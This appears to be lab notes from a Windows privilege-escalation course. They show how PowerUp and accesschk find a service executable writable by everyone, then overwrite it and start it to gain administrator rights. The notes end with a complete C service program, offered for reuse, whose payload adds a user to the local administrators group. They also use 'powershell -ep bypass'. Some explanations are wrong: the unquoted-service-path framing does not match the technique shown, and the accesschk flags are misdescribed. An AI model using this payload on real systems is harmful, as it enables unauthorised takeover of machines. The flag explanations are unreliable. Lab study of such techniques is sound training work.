# 📁 Executable Files

In the context of Windows Privilege Escalation, executable files play a crucial role. Specifically, the focus is often on unquoted service paths, which can lead to privilege escalation vulnerabilities.

An unquoted service path vulnerability occurs when the path to a service executable lacks quotes and contains spaces. For example, `C:\Program Files\SomeExecutable.exe`. If the service path is unquoted and the user has permissions to manipulate objects in the specified path, it may be exploited for privilege escalation

<figure><img src="../../../../.gitbook/assets/image (408).png" alt=""><figcaption></figcaption></figure>

### Overview <a href="#lecture_heading" id="lecture_heading"></a>

So first go to your rdesktop window and go into the powerup file:

<figure><img src="../../../../.gitbook/assets/image (409).png" alt=""><figcaption><p>Don't forget the "powershell -ep bypass" command</p></figcaption></figure>

Run a&#x20;

```
. .\PowerUp.ps1
#and a 
Invoke-AllChecks
```

Next we went and tried to run the command `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"` and it reveals a potential security risk related to unrestricted file permissions. Specifically, it highlights that the "Everyone" user group possesses "FILE\_ALL\_ACCESS" permissions on the `filepermservice.exe` executable.

1. **Accesschk64:** Accesschk is a Windows utility used for checking effective permissions on files, directories, registry keys, etc. The command `accesschk64.exe -wvu "C:\Program Files\File Permissions Service"` is checking the permissions of the specified file.
2. **-wvu Option:**
   * `-w`: Checks the effective permissions.
   * `-v`: Verbose mode, provides detailed output.
   * `-u`: Shows ownership information.

It was first seen in the powerUp output:

<figure><img src="../../../../.gitbook/assets/image (410).png" alt=""><figcaption></figcaption></figure>

and then confirmed manually:

<figure><img src="../../../../.gitbook/assets/image (411).png" alt=""><figcaption></figcaption></figure>

Observe the output for the `filepermservice.exe` file. If the "Everyone" group has "FILE\_ALL\_ACCESS" permissions, it indicates a potential security vulnerability.

### Escalation <a href="#lecture_heading" id="lecture_heading"></a>

download the x.exe file in the previous room on your windows machine again, but this time&#x20;

<figure><img src="../../../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

save it at this location and overwrite the already existing filepermservice file

for the moment, we don't have any unusual people in our administrators local group:

<figure><img src="../../../../.gitbook/assets/image (424).png" alt=""><figcaption></figcaption></figure>

except if we do a&#x20;

```
sc start filepermsvc
```

<figure><img src="../../../../.gitbook/assets/image (425).png" alt=""><figcaption></figcaption></figure>

that's more than an easy win

so basically with the powerup tool we found that we had an executable file called filepermsvc that was modifiable by anyone, so we modified it with a malicious C file that made us escalate to administrators local group

if needed, here is the malicious C file

```c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 

```
